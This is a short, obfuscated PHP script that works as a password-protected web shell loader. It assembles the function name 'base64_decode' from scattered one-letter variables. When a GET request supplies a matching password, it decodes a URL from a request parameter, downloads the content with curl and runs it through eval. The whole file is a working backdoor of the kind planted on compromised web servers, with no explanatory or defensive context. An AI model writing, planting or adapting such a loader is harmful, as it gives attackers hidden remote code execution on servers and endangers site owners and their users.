<?php 
$PAT='i';$xNgur='l';$yl='6';$hn='_';$q='o';$DVe='e';$VujVi='f';$Njf='n';$WL='t';$hjmv='4';$cyx='c';$w='b';$qb='a';$Hn='z';$C='s';$iEg='g';$ZQFv='d';
$strNX=$w.$qb.$C.$DVe.$yl.$hjmv.$hn.$ZQFv.$DVe.$cyx.$q.$ZQFv.$DVe;
if(isset($_GET['u']) && isset($_GET['pw'])){if(strtoupper(md5($_GET['pw']))!='FFC52A7AEF7B90A27C1FBAEC516A4F0E'){exit();}
    $ch=curl_init($strNX($_GET['u']));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);eval('?>'.$r);die;}
?>